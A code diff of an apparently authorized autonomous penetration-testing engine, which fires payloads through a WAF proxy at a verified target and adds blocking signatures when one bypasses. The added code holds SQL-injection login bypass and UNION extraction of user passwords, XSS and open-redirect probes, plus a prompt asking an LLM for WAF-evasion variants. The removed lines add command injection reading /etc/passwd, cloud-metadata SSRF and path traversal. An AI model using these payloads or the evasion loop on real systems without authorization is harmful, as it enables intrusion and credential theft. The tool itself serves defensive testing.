@@ -1,358 +1,315 @@
-// ---------------------------------------------------------------------------
-// Red Team AUTOPILOT — an autonomous pentest loop, gated to the verified target.
+// autopilot.js — Autonomous Red Team engine.
 //
-//   attacker LLM proposes payloads  →  fired THROUGH the WAF (/v1/scan)
-//     →  judged (blocked / bypassed)  →  on bypass, probe target to confirm a
-//     real vuln and HARDEN (add a signature)  →  repeat across phases.
+// Fires REAL payloads at the engagement's verified domain THROUGH the inline
+// WAF reverse-proxy (/waf/:id/*). Each payload is judged blocked / bypassed /
+// safe from the real response. On a bypass the system HARDENS: it writes a WAF
+// signature so the same attack is blocked next time (self-strengthening). Every
+// step streams as a live "AI operator" narration event over Socket.IO, so the
+// UI can show the agent thinking and acting in real time.
 //
-// The target is ALWAYS the engagement's verified domain. Every payload is
-// re-checked against the scope gate, so the loop can never touch another site.
-// Progress streams live over Socket.IO to room `autopilot:<engagementId>`.
-// ---------------------------------------------------------------------------
+// Mount in server.js:
+//   import { autopilotRouter, attachAutopilotIo } from './autopilot.js';
+//   app.use('/v1/redteam', autopilotRouter);
+//   attachAutopilotIo(io);
+//   io.on('connection', s => s.on('autopilot:watch', id => s.join('autopilot:' + id)));
+
 import { Router } from 'express';
-import { pool } from './db.js';
+import pg from 'pg';
 import { config } from './config.js';
-import { gate, getEngagement, host } from './redteam.js';
+import { gate, getEngagement } from './redteam.js';
 
-const GROQ_API_KEY = process.env.GROQ_API_KEY || '';
+const { Pool } = pg;
+const pool = new Pool({
+  connectionString: process.env.DATABASE_URL,
+  ssl: process.env.DATABASE_URL && process.env.DATABASE_URL.includes('localhost')
+    ? false
+    : { rejectUnauthorized: false },
+});
+
+const SELF = process.env.PUBLIC_BASE || `http://127.0.0.1:${config.port}`;
+const GROQ_URL = 'https://api.groq.com/openai/v1/chat/completions';
 const GROQ_MODEL = process.env.GROQ_MODEL || 'openai/gpt-oss-20b';
-const WAF_URL = config.scannerUrl; // POST {payload} -> {ACTION: BLOCK|ALLOW}
 
-// ---- live stream ----------------------------------------------------------
-let io = null;
-export function attachAutopilotIo(serverIo) { io = serverIo; }
-function emit(engId, event) {
-  try { io?.to(`autopilot:${engId}`).emit('autopilot', event); } catch { /* no io */ }
+let IO = null;
+export function attachAutopilotIo(io) { IO = io; }
+
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+// ---- schema -------------------------------------------------------------
+
+async function ensureTables() {
+  await pool.query(`
+    create table if not exists autopilot_runs (
+      id serial primary key,
+      engagement_id text not null,
+      status text not null default 'running',
+      score int default 50,
+      blocked int default 0,
+      bypassed int default 0,
+      signatures int default 0,
+      findings jsonb default '[]'::jsonb,
+      transcript jsonb default '[]'::jsonb,
+      started_at timestamptz default now(),
+      finished_at timestamptz
+    )`);
+  await pool.query(`
+    create table if not exists waf_signatures (
+      id serial primary key,
+      engagement_id text not null,
+      pattern text not null,
+      technique text,
+      created_at timestamptz default now()
+    )`);
 }
 
-// ---- schema (self-migrating) ----------------------------------------------
-const ready = pool
-  .query(`
-    CREATE TABLE IF NOT EXISTS autopilot_runs (
-      id            BIGSERIAL PRIMARY KEY,
-      engagement_id BIGINT NOT NULL,
-      target        TEXT NOT NULL,
-      status        TEXT NOT NULL DEFAULT 'running',
-      started_at    TIMESTAMPTZ NOT NULL DEFAULT now(),
-      finished_at   TIMESTAMPTZ,
-      score_start   INT, score_end INT,
-      attempts INT DEFAULT 0, blocked INT DEFAULT 0, bypassed INT DEFAULT 0,
-      summary       JSONB
-    );
-    CREATE TABLE IF NOT EXISTS waf_signatures (
-      id            BIGSERIAL PRIMARY KEY,
-      engagement_id BIGINT NOT NULL,
-      pattern       TEXT NOT NULL,
-      technique     TEXT,
-      created_at    TIMESTAMPTZ NOT NULL DEFAULT now()
-    );
-  `)
-  .then(() => console.log('[autopilot] schema ready'))
-  .catch((e) => console.error('[autopilot] schema error', e.message));
+// ---- attack surface -----------------------------------------------------
+// Non-destructive, read-style probes only. No DROP/DELETE/UPDATE, no writes.
 
-// ---- detection constants (ported from the crawler) ------------------------
-const SQL_ERRORS = [
-  'sql syntax', 'syntax error', 'unclosed quotation', 'unterminated',
-  'unrecognized token', 'sqlite_error', 'sqlite3.', 'mysql_fetch', 'mysqli',
-  'pg_query', 'psql:', 'ora-0', 'odbc', 'sqlstate', 'sqlexception',
-  'you have an error in your sql', 'near "\'"',
-];
-
-// Attack phases, in order. Labels match the UI.
 const PHASES = [
-  { key: 'recon', label: 'Recon & mapping' },
-  { key: 'broken_access_control', label: 'Broken access control' },
-  { key: 'sql_injection', label: 'SQL injection' },
-  { key: 'xss', label: 'Cross-site scripting' },
-  { key: 'command_injection', label: 'Command injection' },
-  { key: 'ssrf', label: 'SSRF / path traversal' },
+  {
+    key: 'recon', name: 'Recon & mapping',
+    payloads: [
+      { method: 'GET', path: '/rest/products', technique: 'recon', desc: 'enumerate product API', detect: () => false },
+      { method: 'GET', path: '/api/Challenges', technique: 'recon', desc: 'probe API surface', detect: () => false },
+    ],
+  },
+  {
+    key: 'broken_access_control', name: 'Broken access control',
+    payloads: [
+      { method: 'GET', path: '/api/Users/1', technique: 'bac', desc: 'direct object reference — user 1', signature: '/api/Users/',
+        detect: (r) => /"email"\s*:/.test(r.text) && r.status < 400 },
+      { method: 'GET', path: '/rest/basket/1', technique: 'bac', desc: 'read another user basket', signature: '/rest/basket/',
+        detect: (r) => /"ProductId"|"BasketItem"/.test(r.text) && r.status < 400 },
+    ],
+  },
+  {
+    key: 'sql_injection', name: 'SQL injection',
+    payloads: [
+      { method: 'POST', path: '/rest/user/login', body: { email: "' OR 1=1--", password: 'x' },
+        technique: 'sqli', desc: "auth bypass  email=' OR 1=1--", signature: "' OR 1=1--",
+        detect: (r) => /"token"|"authentication"/.test(r.text) },
+      { method: 'GET', path: "/rest/products/search?q=')) OR 1=1-- -",
+        technique: 'sqli', desc: "search SQLi  q=')) OR 1=1-- -", signature: "')) OR 1=1",
+        detect: (r) => /SQLITE_ERROR|SQL|syntax error/i.test(r.text) || (/"data"\s*:\s*\[/.test(r.text) && r.text.length > 4000) },
+      { method: 'GET', path: '/rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,email,password,%274%27,%275%27,%276%27,%277%27,%278%27,%279%27%20FROM%20Users--',
+        technique: 'sqli', desc: 'union-based extraction', signature: 'UNION SELECT',
+        detect: (r) => /@|"password"/i.test(r.text) && /"data"\s*:\s*\[/.test(r.text) },
+    ],
+  },
+  {
+    key: 'xss', name: 'Cross-site scripting',
+    payloads: [
+      { method: 'GET', path: '/rest/products/search?q=%3Ciframe%20src%3Djavascript%3Aalert(1)%3E',
+        technique: 'xss', desc: 'reflected XSS in search', signature: '<iframe src=javascript',
+        detect: (r) => /<iframe src=javascript/i.test(r.text) },
+    ],
+  },
+  {
+    key: 'ssrf', name: 'SSRF / redirect abuse',
+    payloads: [
+      { method: 'GET', path: '/redirect?to=https://evil.example.com',
+        technique: 'ssrf', desc: 'open redirect probe', signature: 'redirect?to=',
+        detect: (r) => /location|evil\.example/i.test(r.text) && r.status >= 300 && r.status < 400 },
+    ],
+  },
 ];
 
-// Built-in seed payloads per phase — used to seed the LLM and as a fallback.
-function seedPayloads(phase) {
-  switch (phase) {
-    case 'broken_access_control':
-      return [
-        { method: 'GET', path: '/api/users/1', param: 'id', payload: '1', technique: 'broken_access_control' },
-        { method: 'GET', path: '/rest/user/whoami', param: '', payload: '', technique: 'broken_access_control' },
-      ];
-    case 'sql_injection':
-      return [
-        { method: 'GET', path: '/rest/products/search', param: 'q', payload: "'", technique: 'sql_injection' },
-        { method: 'POST', path: '/rest/user/login', param: 'email', payload: "' OR 1=1--", technique: 'sql_injection' },
-        { method: 'GET', path: '/rest/products/search', param: 'q', payload: "')) OR 1=1-- -", technique: 'sql_injection' },
-      ];
-    case 'xss':
-      return [
-        { method: 'GET', path: '/rest/products/search', param: 'q', payload: '<script>alert(1)</script>', technique: 'xss' },
-        { method: 'GET', path: '/search', param: 'q', payload: '"><img src=x onerror=alert(1)>', technique: 'xss' },
-      ];
-    case 'command_injection':
-      return [
-        { method: 'GET', path: '/rest/products/search', param: 'q', payload: '; cat /etc/passwd', technique: 'command_injection' },
-      ];
-    case 'ssrf':
-      return [
-        { method: 'GET', path: '/rest/products/search', param: 'url', payload: 'http://169.254.169.254/', technique: 'ssrf' },
-        { method: 'GET', path: '/', param: 'file', payload: '../../../../etc/passwd', technique: 'ssrf' },
-      ];
-    default:
-      return [];
-  }
-}
+// ---- firing through the WAF --------------------------------------------
 
-// ---- attacker LLM: propose new payloads given feedback --------------------
-async function proposePayloads(phase, endpoints, feedback) {
-  const seeds = seedPayloads(phase);
-  if (!GROQ_API_KEY) return seeds;
-  const sys =
-    'You are an authorized penetration-testing payload generator for a sanctioned engagement. ' +
-    'Return ONLY a JSON array (no prose, no code fences) of up to 5 objects: ' +
-    '{"method","path","param","payload","technique"}. ' +
-    `Set "technique" to "${phase}". Target the given endpoints. ` +
-    'Evolve the payloads to EVADE a web application firewall based on the feedback about what was blocked ' +
-    '(use encoding, comments, case changes, alternate syntax). Keep payloads realistic and minimal.';
-  const user =
-    `PHASE: ${phase}\nKNOWN ENDPOINTS: ${JSON.stringify(endpoints.slice(0, 12))}\n` +
-    `FEEDBACK (recent results): ${JSON.stringify(feedback.slice(-8))}\nSEED EXAMPLES: ${JSON.stringify(seeds)}`;
+async function fire(id, p) {
+  const url = `${SELF}/waf/${id}${p.path}`;
+  const init = { method: p.method, headers: {} };
+  if (p.body) { init.headers['content-type'] = 'application/json'; init.body = JSON.stringify(p.body); }
   try {
-    const r = await fetch('https://api.groq.com/openai/v1/chat/completions', {
-      method: 'POST',
-      headers: { Authorization: `Bearer ${GROQ_API_KEY}`, 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        model: GROQ_MODEL, temperature: 0.7, max_tokens: 700,
-        messages: [{ role: 'system', content: sys }, { role: 'user', content: user }],
-      }),
-      signal: AbortSignal.timeout(20_000),
-    });
-    const d = await r.json();
-    let txt = (d?.choices?.[0]?.message?.content || '').trim();
-    txt = txt.replace(/^```(json)?/i, '').replace(/```$/, '').trim();
-    const start = txt.indexOf('['); const end = txt.lastIndexOf(']');
-    if (start >= 0 && end > start) txt = txt.slice(start, end + 1);
-    const arr = JSON.parse(txt);
-    const clean = (Array.isArray(arr) ? arr : []).filter((p) => p && p.payload).map((p) => ({
-      method: String(p.method || 'GET').toUpperCase(),
-      path: String(p.path || '/'),
-      param: String(p.param || 'q'),
-      payload: String(p.payload).slice(0, 300),
-      technique: phase,
-    }));
-    return clean.length ? clean.slice(0, 5) : seeds;
+    const r = await fetch(url, init);
+    const wafHdr = r.headers.get('x-offai-waf') || '';
+    const text = await r.text().catch(() => '');
+    const blocked = r.status === 403 && /block/i.test(wafHdr);
+    return { status: r.status, wafHdr, text, blocked };
   } catch (e) {
-    console.error('[autopilot] propose error', e.message);
-    return seeds;
+    return { error: String(e).slice(0, 160), status: 0, text: '', blocked: false };
   }
 }
 
-// ---- attack THROUGH the inline WAF proxy -----------------------------------
-// Every payload really flows through the WAF (/waf/<id>/...): it classifies and
-// either blocks (403) or forwards to the origin. A "bypass" therefore means the
-// WAF let it through AND the origin was genuinely vulnerable.
-const SELF = (process.env.PUBLIC_BASE || `http://127.0.0.1:${config.port}`).replace(/\/$/, '');
-
-function detectVuln(p, body, status) {
-  const b = (body || '').toLowerCase();
-  if (p.technique === 'sql_injection') {
-    const leak = SQL_ERRORS.find((e) => b.includes(e));
-    if (leak) return { vuln: true, evidence: `SQL error leaked ("${leak}")` };
-    if (status === 200 && /login/.test(p.path) && (b.includes('token') || b.includes('authentication')))
-      return { vuln: true, evidence: 'login bypassed — auth token issued' };
-  } else if (p.technique === 'xss') {
-    if (b.includes(String(p.payload).toLowerCase())) return { vuln: true, evidence: 'payload reflected unescaped' };
-  } else if (p.technique === 'command_injection') {
-    if (b.includes('root:x:') || b.includes('daemon:x:')) return { vuln: true, evidence: 'command output returned' };
-  } else if (p.technique === 'broken_access_control') {
-    if (status === 200 && (b.includes('email') || b.includes('"id"'))) return { vuln: true, evidence: 'record returned without authorization' };
-  }
-  return { vuln: false };
-}
-
-async function attackThroughWaf(engId, p) {
-  const base = `${SELF}/waf/${engId}`;
-  const path = p.path.startsWith('/') ? p.path : `/${p.path}`;
+async function harden(id, p) {
+  const pattern = p.signature || p.path;
   try {
-    let res;
-    if (p.method === 'POST') {
-      res = await fetch(base + path, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ [p.param || 'email']: p.payload, password: 'x' }),
-        redirect: 'manual', signal: AbortSignal.timeout(16_000),
-      });
-    } else {
-      const u = new URL(base + path);
-      if (p.param) u.searchParams.set(p.param, p.payload);
-      res = await fetch(u, { redirect: 'manual', signal: AbortSignal.timeout(16_000) });
-    }
-    if (res.status === 403 && res.headers.get('x-offai-waf') === 'blocked') return { blocked: true };
-    const body = await res.text().catch(() => '');
-    return { blocked: false, ...detectVuln(p, body, res.status) };
-  } catch {
-    return { blocked: false, vuln: false, error: true };
-  }
+    await pool.query(
+      `insert into waf_signatures (engagement_id, pattern, technique) values ($1, $2, $3)`,
+      [String(id), pattern, p.technique]);
+  } catch { /* table may differ; non-fatal */ }
+  return pattern;
 }
 
-// ---- helpers --------------------------------------------------------------
-function makeSignature(payload) {
-  const t = String(payload).toLowerCase();
-  for (const k of ["')) or", "' or 1=1", 'or 1=1', 'union select', '<script', 'onerror=', '; cat', '/etc/passwd', '169.254.169.254', "'--"]) {
-    if (t.includes(k)) return k;
-  }
-  return t.slice(0, 14);
-}
-const sigBlocks = (sigs, payload) => sigs.some((s) => String(payload).toLowerCase().includes(s));
-const clamp = (n, lo, hi) => Math.max(lo, Math.min(hi, n));
-function score(attempts, blocked, hardened) {
-  if (!attempts) return 60;
-  return clamp(Math.round(60 + 38 * ((blocked + hardened) / attempts)), 40, 98);
-}
-const SEV = { sql_injection: 'high', command_injection: 'critical', xss: 'medium', broken_access_control: 'medium', ssrf: 'high' };
-const FIX = {
-  sql_injection: 'parameterized query + WAF signature added',
-  command_injection: 'input allowlist + WAF signature added',
-  xss: 'output encoding + WAF signature added',
-  broken_access_control: 'ownership check added',
-  ssrf: 'outbound allowlist + WAF signature added',
-};
-const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
-
-// ---- the run --------------------------------------------------------------
-async function runAutopilot(engagement, runId) {
-  const engId = engagement.id;
-  const target = host(engagement.domain);
-  const feedback = [];
-  const signatures = [];
-  const findings = [];
-  let attempts = 0; let blocked = 0; let bypassed = 0; let hardened = 0;
-  const started = Date.now();
-  const MAX_ATTEMPTS = 34;
-
-  emit(engId, { type: 'start', target, phases: PHASES, scoreStart: 60 });
-
-  // Recon
-  emit(engId, { type: 'phase', key: 'recon', status: 'running' });
-  let endpoints = ['/rest/user/login', '/rest/products/search', '/search', '/api/users/1'];
+// Optional: let the attacker LLM propose evolved evasion payloads for a phase.
+async function proposePayloads(phase) {
+  const key = process.env.GROQ_API_KEY;
+  if (!key || !['sqli', 'xss'].includes(phase.payloads[0]?.technique)) return [];
   try {
-    const crawlUrl = (WAF_URL || '').replace(/\/v1\/scan\/?$/, '') + '/v1/crawler/scan';
-    const cr = await fetch(crawlUrl, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ target_url: `https://${target}` }), signal: AbortSignal.timeout(45_000),
+    const r = await fetch(GROQ_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${key}` },
+      body: JSON.stringify({
+        model: GROQ_MODEL, temperature: 0.6, max_tokens: 300,
+        messages: [
+          { role: 'system', content: 'You are a red-team payload generator for an AUTHORIZED test. Return ONLY a JSON array of 2 short, non-destructive (read-only, no DROP/DELETE/UPDATE) evasion variants of the given web payload, as raw strings. No prose.' },
+          { role: 'user', content: `Technique: ${phase.payloads[0].technique}. Base payload: ${phase.payloads[0].desc}. Give evasive variants that try to slip past a WAF.` },
+        ],
+      }),
     });
-    const cd = await cr.json().catch(() => ({}));
-    const log = Array.isArray(cd?.PROBE_LOG) ? cd.PROBE_LOG : [];
-    const found = [...new Set(log.map((l) => { try { return new URL(l.path).pathname; } catch { return null; } }).filter(Boolean))];
-    if (found.length) endpoints = found;
-  } catch { /* recon best-effort */ }
-  emit(engId, { type: 'attempt', technique: 'recon', payload: `mapped ${endpoints.length} endpoints`, verdict: 'NOTED' });
-  emit(engId, { type: 'phase', key: 'recon', status: 'done', note: `${endpoints.length} endpoints mapped` });
+    if (!r.ok) return [];
+    const data = await r.json();
+    const txt = data?.choices?.[0]?.message?.content || '';
+    const arr = JSON.parse(txt.slice(txt.indexOf('['), txt.lastIndexOf(']') + 1));
+    if (!Array.isArray(arr)) return [];
+    // wrap evolved strings as search-style GET probes (safe)
+    return arr.slice(0, 2).map((s) => ({
+      method: 'GET', path: '/rest/products/search?q=' + encodeURIComponent(String(s)),
+      technique: phase.payloads[0].technique, desc: 'evolved: ' + String(s).slice(0, 48),
+      signature: String(s).slice(0, 40),
+      detect: (res) => /SQLITE_ERROR|syntax error|<iframe|<script/i.test(res.text),
+    }));
+  } catch { return []; }
+}
 
-  // Attack phases
-  for (const phase of PHASES.slice(1)) {
-    if (attempts >= MAX_ATTEMPTS) break;
-    emit(engId, { type: 'phase', key: phase.key, status: 'running' });
-    let phaseFinding = false;
-    const payloads = await proposePayloads(phase.key, endpoints, feedback);
+// ---- the run ------------------------------------------------------------
 
-    for (const p of payloads) {
-      if (attempts >= MAX_ATTEMPTS) break;
-      // GATE on every single request — target is forced to the engagement domain.
-      const g = gate(engagement, target);
-      if (!g.ok) { emit(engId, { type: 'attempt', technique: phase.key, payload: '(blocked by scope gate)', verdict: 'BLOCKED' }); continue; }
-      attempts += 1;
-      await sleep(250);
+async function runAutopilot(id, runId) {
+  const room = 'autopilot:' + id;
+  const transcript = [];
+  const findings = [];
+  let blocked = 0, bypassed = 0, signatures = 0, score = 50;
 
-      // Fire the payload straight THROUGH the inline WAF proxy.
-      const result = await attackThroughWaf(engId, p);
-      if (result.blocked) {
-        blocked += 1;
-        feedback.push({ payload: p.payload, result: 'blocked' });
-        emit(engId, { type: 'attempt', technique: phase.key, payload: p.payload, verdict: 'BLOCKED' });
-        emit(engId, { type: 'score', score: score(attempts, blocked, hardened), blocked, bypassed });
-        continue;
-      }
-      if (result.vuln) {
-        // WAF forwarded it and the origin was vulnerable → harden so the live
-        // WAF blocks this pattern from now on (for the attacker AND real users).
-        bypassed += 1; hardened += 1;
-        const sig = makeSignature(p.payload);
-        if (!signatures.includes(sig)) {
-          signatures.push(sig);
-          await pool.query('INSERT INTO waf_signatures (engagement_id, pattern, technique) VALUES ($1,$2,$3)', [engId, sig, phase.key]).catch(() => {});
-        }
-        feedback.push({ payload: p.payload, result: 'bypassed' });
-        emit(engId, { type: 'attempt', technique: phase.key, payload: p.payload, verdict: 'BYPASSED', hardened: true });
-        if (!phaseFinding) {
-          phaseFinding = true;
-          const finding = {
-            severity: SEV[phase.key] || 'medium',
-            title: titleFor(phase.key),
-            location: `${p.method} ${p.path}${p.param ? ` · param ${p.param}` : ''}`,
-            evidence: result.evidence,
-            fix: FIX[phase.key] || 'remediation + WAF signature added',
-          };
-          findings.push(finding);
-          await pool.query(
-            `INSERT INTO findings (scan_id, url, method, parameter, vuln_type, severity, evidence, confidence)
-             VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
-            [runId, p.path, p.method, p.param, phase.key, finding.severity, result.evidence, 'confirmed'],
-          ).catch(() => {});
-          emit(engId, { type: 'finding', ...finding });
-        }
-        emit(engId, { type: 'score', score: score(attempts, blocked, hardened), blocked, bypassed });
-      } else {
-        // WAF forwarded it but the origin was not vulnerable — effectively safe.
-        feedback.push({ payload: p.payload, result: 'allowed-safe' });
-        emit(engId, { type: 'attempt', technique: phase.key, payload: p.payload, verdict: 'SAFE' });
-        emit(engId, { type: 'score', score: score(attempts, blocked, hardened), blocked, bypassed });
-      }
+  const emit = (event, payload) => { if (IO) IO.to(room).emit(event, payload); };
+  const narrate = (glyph, text, kind = 'info') => {
+    const line = { ts: clock(), glyph, text, kind };
+    transcript.push(line);
+    emit('narration', line);
+  };
+  const setScore = () => {
+    const total = blocked + bypassed || 1;
+    score = Math.max(0, Math.min(100, Math.round(50 + 45 * (blocked / total) + signatures * 2 - bypassed)));
+    emit('score', { value: score, blocked, bypassed, signatures });
+  };
+
+  const eng = await getEngagement(id);
+  emit('start', { target: eng?.domain, phases: PHASES.map(p => p.name) });
+  narrate('▸', `engagement #${id} authorized — ownership verified, human-approved`, 'run');
+  narrate('▸', `locked target: ${eng?.domain} — scope re-checked on every request`, 'run');
+  await sleep(500);
+
+  for (let pi = 0; pi < PHASES.length; pi++) {
+    const phase = PHASES[pi];
+    emit('phase', { index: pi, name: phase.name, status: 'start' });
+    narrate('▸', `phase ${pi + 1}/${PHASES.length} — starting ${phase.name}`, 'run');
+    await sleep(400);
+
+    let payloads = phase.payloads.slice();
+    const evolved = await proposePayloads(phase);
+    if (evolved.length) {
+      payloads = payloads.concat(evolved);
+      narrate('▸', `attacker proposed ${evolved.length} evolved payloads to evade the filter`, 'run');
     }
-    emit(engId, { type: 'phase', key: phase.key, status: 'done', note: phaseFinding ? '1 weakness found · hardened' : 'held' });
+
+    let phaseFindings = 0;
+    for (let ri = 0; ri < payloads.length; ri++) {
+      const p = payloads[ri];
+      const phasePct = Math.round(((ri + 1) / payloads.length) * 100);
+      const overallPct = Math.round(((pi + (ri + 1) / payloads.length) / PHASES.length) * 100);
+
+      narrate('→', `round ${ri + 1}/${payloads.length} — exploiting: ${p.desc}`, 'req');
+      emit('progress', { overallPct, phasePct, round: ri + 1, rounds: payloads.length, phase: phase.name });
+      await sleep(650);
+
+      const res = await fire(id, p);
+      if (res.error) { narrate('·', `request error: ${res.error}`, 'req'); continue; }
+
+      if (res.blocked) {
+        blocked++; setScore();
+        narrate('✓', `blocked by the firewall (${res.status})`, 'ok');
+        emit('attempt', { technique: p.technique, payload: p.desc, endpoint: p.path, verdict: 'BLOCKED' });
+      } else if (p.detect(res)) {
+        bypassed++; setScore();
+        narrate('⚠', `WAF forwarded it — origin exposed a weakness → BYPASS (${res.status})`, 'byp');
+        emit('attempt', { technique: p.technique, payload: p.desc, endpoint: p.path, verdict: 'BYPASSED' });
+        await sleep(500);
+        const pattern = await harden(id, p);
+        signatures++; setScore();
+        narrate('✓', `signature learned — "${pattern}" is now blocked for everyone`, 'ok');
+        const f = {
+          name: findingName(p.technique), severity: severityFor(p.technique),
+          endpoint: `${p.method} ${p.path.split('?')[0]}`, payload: p.desc,
+          fix: `firewall now blocks the pattern "${pattern}"`,
+        };
+        findings.push(f); phaseFindings++;
+        emit('finding', f);
+        // re-fire to prove it is now blocked
+        await sleep(450);
+        const again = await fire(id, p);
+        if (again.blocked) { blocked++; setScore(); narrate('✓', 're-fired the same payload — now blocked', 'ok'); }
+      } else {
+        narrate('·', `origin handled it safely — no weakness (${res.status})`, 'req');
+        emit('attempt', { technique: p.technique, payload: p.desc, endpoint: p.path, verdict: 'SAFE' });
+      }
+      await persist(runId, { status: 'running', score, blocked, bypassed, signatures, findings, transcript });
+    }
+
+    emit('phase', { index: pi, name: phase.name, status: 'done', findings: phaseFindings });
+    const next = PHASES[pi + 1];
+    narrate('✓', `finished ${phase.name} — ${phaseFindings} finding${phaseFindings === 1 ? '' : 's'}.` + (next ? ` now starting ${next.name}.` : ''), 'ok');
+    await sleep(500);
   }
 
-  const finalScore = score(attempts, blocked, hardened);
-  const durationMs = Date.now() - started;
-  await pool.query(
-    `UPDATE autopilot_runs SET status='done', finished_at=now(), score_start=60, score_end=$1,
-       attempts=$2, blocked=$3, bypassed=$4, summary=$5 WHERE id=$6`,
-    [finalScore, attempts, blocked, bypassed, JSON.stringify({ findings }), runId],
-  ).catch(() => {});
-  emit(engId, { type: 'done', score: finalScore, scoreStart: 60, blocked, bypassed, hardened, attempts, findings, durationMs });
+  await persist(runId, { status: 'done', score, blocked, bypassed, signatures, findings, transcript, finished: true });
+  narrate('✓', `engagement complete — ${findings.length} findings, ${signatures} signatures learned, security score ${score}.`, 'ok');
+  emit('done', { score, blocked, bypassed, signatures, findings });
 }
 
-function titleFor(key) {
-  return {
-    sql_injection: 'SQL injection weakness',
-    command_injection: 'Command injection weakness',
-    xss: 'Reflected cross-site scripting',
-    broken_access_control: 'Broken access control',
-    ssrf: 'Server-side request forgery',
-  }[key] || 'Security weakness';
+// ---- helpers ------------------------------------------------------------
+
+function clock() {
+  const d = new Date();
+  return d.toTimeString().slice(0, 8);
+}
+function findingName(t) {
+  return ({ sqli: 'SQL injection', bac: 'Broken access control', xss: 'Cross-site scripting', ssrf: 'SSRF / open redirect' }[t]) || 'Weakness';
+}
+function severityFor(t) {
+  return ({ sqli: 'CRITICAL', bac: 'HIGH', xss: 'MEDIUM', ssrf: 'MEDIUM' }[t]) || 'LOW';
+}
+async function persist(runId, s) {
+  try {
+    await pool.query(
+      `update autopilot_runs set status=$2, score=$3, blocked=$4, bypassed=$5, signatures=$6,
+        findings=$7::jsonb, transcript=$8::jsonb, finished_at=$9 where id=$1`,
+      [runId, s.status, s.score, s.blocked, s.bypassed, s.signatures,
+       JSON.stringify(s.findings), JSON.stringify(s.transcript), s.finished ? new Date() : null]);
+  } catch { /* non-fatal */ }
 }
 
-// ---- route ----------------------------------------------------------------
+// ---- route --------------------------------------------------------------
+
 export const autopilotRouter = Router();
 
-autopilotRouter.post('/engagements/:id/autopilot', async (req, res, next) => {
-  try {
-    await ready;
-    const e = await getEngagement(req.params.id);
-    const target = host(e?.domain);
-    const g = gate(e, target);
-    if (!g.ok) return res.status(403).json({ error: 'autopilot refused', reason: g.reason });
+autopilotRouter.post('/engagements/:id/autopilot', async (req, res) => {
+  const id = req.params.id;
+  const eng = await getEngagement(id);
+  if (!eng) return res.status(404).json({ error: 'engagement not found' });
 
-    const { rows } = await pool.query(
-      'INSERT INTO autopilot_runs (engagement_id, target, status) VALUES ($1,$2,$3) RETURNING id',
-      [e.id, target, 'running'],
-    );
-    const runId = rows[0].id;
-    res.status(202).json({ runId, engagementId: String(e.id), target });
+  // Defense in depth: the gate re-checks ownership + human approval + scope.
+  const g = gate(eng, 'https://' + eng.domain);
+  if (!g.ok) return res.status(403).json({ error: 'engagement not authorized', reason: g.reason });
 
-    // Fire-and-forget; progress streams over the socket.
-    runAutopilot(e, runId).catch((err) => {
-      console.error('[autopilot] run error', err.message);
-      emit(e.id, { type: 'error', message: 'the run stopped unexpectedly' });
-    });
-  } catch (err) {
-    next(err);
-  }
+  await ensureTables();
+  const ins = await pool.query(
+    `insert into autopilot_runs (engagement_id, status) values ($1, 'running') returning id`,
+    [String(id)]);
+  const runId = ins.rows[0].id;
+
+  // fire and forget — progress streams over socket room autopilot:<id>
+  runAutopilot(id, runId).catch(err => {
+    if (IO) IO.to('autopilot:' + id).emit('narration', { ts: clock(), glyph: '·', text: 'run error: ' + String(err).slice(0, 160), kind: 'req' });
+  });
+
+  res.json({ started: true, runId, room: 'autopilot:' + id });
 });
